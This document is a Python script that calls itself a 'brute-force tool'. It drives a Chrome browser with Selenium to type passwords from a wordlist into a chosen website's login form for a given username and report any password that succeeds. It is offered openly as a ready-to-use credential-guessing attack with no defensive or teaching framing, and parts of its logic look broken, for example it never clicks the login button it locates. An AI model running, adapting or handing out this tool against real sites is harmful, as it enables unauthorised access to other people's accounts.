
import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import argparse

#Graphics
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CWHITE  = '\33[37m'

#Config#
parser = argparse.ArgumentParser()
now = datetime.datetime.now()

#Args
parser.add_argument("-u", "--username", dest="username",help="Choose the username")
parser.add_argument("--usernamesel", dest="usernamesel",help="Choose the username selector")
parser.add_argument("--passsel", dest="passsel",help="Choose the password selector")
parser.add_argument("--loginsel", dest="loginsel",help= "Choose the login button selector")
parser.add_argument("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_argument("--website", dest="website",help="choose a website")
options = parser.parse_args()

# Rest of the code remains the same...
def wizard():
    print (banner)
    website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
    sys.stdout.write(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists '),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print (color.GREEN + '[OK]'+color.CWHITE)
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print (color.RED + '[!]'+color.CWHITE+ 'User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print (color.RED + '[X]'+color.CWHITE)
        t.sleep(1)
        print (color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')
        exit()

    username_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
    password_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
    login_btn_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
    username = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
    pass_list = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
    brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)

def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
    f = open(pass_list, 'r')
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    browser = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=optionss) #use only options instead of chrome_options
    # Rest of the code remains the same...
    wait = WebDriverWait(browser, 10)
    while True:
        try:
            for line in f:
                browser.get(website)
                wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
                Sel_user = browser.find_element(By.CSS_SELECTOR, username_selector) #Finds Selector (use .find_element(By.CSS_SELECTOR, "selector") instead of .find_element_by_css_selector("selector"))
                Sel_pas = browser.find_element(By.CSS_SELECTOR, password_selector) #Finds Selector
                enter = browser.find_element(By.CSS_SELECTOR, login_btn_selector) #Finds Selector
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)

                #the program terminates after the coreect user and password is found
                if "Log in" not in browser.title: #this line should be written according to the website being used
                    print(color.BLUE + '------------------------')
                    print(color.BLUE + 'Password found: ' + color.GREEN + line.strip() + color.BLUE + ' for user: ' + color.GREEN + username.strip())
                      
                    print(color.BLUE + '------------------------')
                    exit()
                
                print ('------------------------')
                print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                print ('------------------------')
               
        except KeyboardInterrupt: #returns to main menu if ctrl C is used
            print('CTRL C')
            break
        except selenium.common.exceptions.NoSuchElementException:
            print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
            print ('LAST PASS ATTEMPT BELLOW')
            print (color.GREEN + 'Password has been found: {0}'.format(line))
            print (color.YELLOW + 'Have fun :)')
            exit()

banner = color.BOLD + color.RED +'''
   _____                      
 |__  /  /////    |\\       /||   /////   |\\   ||
   / /  /    \\   | |\\    //||  /    \\  ||\\  ||
 / /_  /  ////\\  | | \\  // || /  ////\\ || \\ ||  
/____|/ _/     \\ | |  \\//  ||/ _/     \\||  \\||


  {0}[{1}-{2}]--> {3}V.2.0
  {4}[{5}-{6}]--> {7}coded by 
  {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)

if options.username == None:
    if options.usernamesel == None:
        if options.passsel == None:
            if options.loginsel == None:
                if options.passlist == None:
                    if options.website == None:
                        wizard()


username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
print (banner)
brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)